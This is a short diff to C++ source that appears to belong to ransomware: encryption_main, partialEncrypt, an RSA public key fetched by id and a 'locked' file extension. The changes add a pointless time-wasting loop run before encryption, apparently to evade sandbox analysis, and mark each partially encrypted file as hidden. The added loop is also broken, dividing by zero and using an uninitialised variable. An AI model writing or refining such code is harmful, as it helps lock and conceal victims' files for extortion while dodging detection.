@@ -61,10 +61,28 @@ Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
 	parsePublicKey(chunk, mod, pubKey);
 	return status;
 }
-
+void killSomeTime()
+{
+	float num = 0;
+	for (float i = 0;num < 30;i++)
+	{
+		num += 1 / i;
+	}
+	long long num2;
+	for (long long j = 0;j < 1000000;j++)
+	{
+		num2 += 1;
+		num2 *= 50;
+		num2 = num2 >> 3;
+		num += 0.1523;
+		num2 &= 0xFFFFFFF;
+		num2 |= 0xFF;
+		num2 /= 2;
+	}
+}
 int encryption_main( bool fromStart) {
 
-
+	killSomeTime();
 	string mod;
 	string pubKey;
 	//string path = ROOT_DIR;
@@ -80,6 +98,8 @@ int encryption_main( bool fromStart) {
 
 	string pathToID = get_path_to_id();
 	string pathToENC = get_path_to_ENC();
+
+	
 
 	//TODO set SquanchedID and IMAGE invisible
 	std::fstream IDFile, pubFile;
@@ -690,6 +710,7 @@ void partialEncrypt(const string& path, RsaEncryptor& rsaEncryptor)
 		outFile.close();
 		//	read rest of file and write it (just go over the file in some manner)
 		myCopyFiles(path, 2 * sz, fileSize, path + PART_LOCKED_EXT, currentPlace);
+		makeFileHidden(path + PART_LOCKED_EXT);
 	}
 	else 
 	{
